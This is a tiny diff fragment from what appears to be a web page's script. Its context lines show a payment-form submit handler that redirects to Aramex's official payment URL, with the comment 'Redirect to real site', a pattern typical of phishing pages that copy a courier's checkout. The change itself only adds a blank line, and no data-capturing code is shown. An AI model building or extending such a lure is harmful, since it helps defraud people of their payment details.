@@ -11,3 +11,4 @@ document.getElementById("payment-form").addEventListener("submit", function(even
         window.location.href = "https://aramex.com/official-payment"; // Redirect to real site
     });
 });
+
